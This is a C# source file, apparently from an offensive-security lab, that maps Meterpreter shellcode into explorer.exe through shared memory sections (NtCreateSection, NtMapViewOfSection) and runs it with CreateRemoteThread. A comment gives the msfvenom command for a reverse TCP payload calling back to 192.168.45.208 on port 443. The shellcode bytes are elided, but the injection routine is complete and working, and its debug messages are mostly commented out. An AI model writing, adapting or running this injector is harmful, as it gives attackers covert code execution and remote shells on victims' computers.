using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        // Import necessary native APIs from ntdll.dll and kernel32.dll

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr Handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Constants
        const uint SECTION_ALL_ACCESS = 0x10000000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint SEC_COMMIT = 0x8000000;
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint ViewUnmap = 2;
        const uint ViewShare = 1;

        static void Main(string[] args)
        {
            // INSERT SHELLCODE HERE
	    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.208 LPORT=443 -f csharp
            byte[] buf = new byte[] {...

            // Target process - explorer.exe PID (replace with actual PID)
            Process[] processes = Process.GetProcessesByName("explorer");
            int explorerPid = processes[0].Id;

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, explorerPid);

            if (hProcess == IntPtr.Zero)
            {
                // Console.WriteLine("Failed to open target process.");
                return;
            }

            // Create a section object
            IntPtr sectionHandle;
            ulong maxSize = (ulong)buf.Length;

            uint status = NtCreateSection(
                out sectionHandle,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            if (status != 0)
            {
                // Console.WriteLine($"NtCreateSection failed with status: 0x{status:X}");
                CloseHandle(hProcess);
                return;
            }

            // Map section into local process
            IntPtr localBaseAddress = IntPtr.Zero;
            ulong viewSize = 0;
            status = NtMapViewOfSection(
                sectionHandle,
                Process.GetCurrentProcess().Handle,
                out localBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                IntPtr.Zero,
                out viewSize,
                ViewShare,
                0,
                PAGE_EXECUTE_READWRITE);

            if (status != 0)
            {
                Console.WriteLine($"NtMapViewOfSection (local) failed with status: 0x{status:X}");
                NtClose(sectionHandle);
                CloseHandle(hProcess);
                return;
            }

            // Copy shellcode into the mapped section in local process memory
            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);

            // Map section into remote process
            IntPtr remoteBaseAddress = IntPtr.Zero;
            viewSize = 0;
            status = NtMapViewOfSection(
                sectionHandle,
                hProcess,
                out remoteBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                IntPtr.Zero,
                out viewSize,
                ViewShare,
                0,
                PAGE_EXECUTE_READWRITE);

            if (status != 0)
            {
                // Console.WriteLine($"NtMapViewOfSection (remote) failed with status: 0x{status:X}");
                NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBaseAddress);
                NtClose(sectionHandle);
                CloseHandle(hProcess);
                return;
            }

            // Unmap local view as it's no longer needed
            NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBaseAddress);

            // Close section handle as it's no longer needed
            NtClose(sectionHandle);

            // Create remote thread to execute shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                // Console.WriteLine("Failed to create remote thread.");
                NtUnmapViewOfSection(hProcess, remoteBaseAddress);
                CloseHandle(hProcess);
                return;
            }

            // Console.WriteLine("Shellcode injected and remote thread created successfully.");

            // Close handles
            CloseHandle(hThread);
            CloseHandle(hProcess);
        }
    }
}
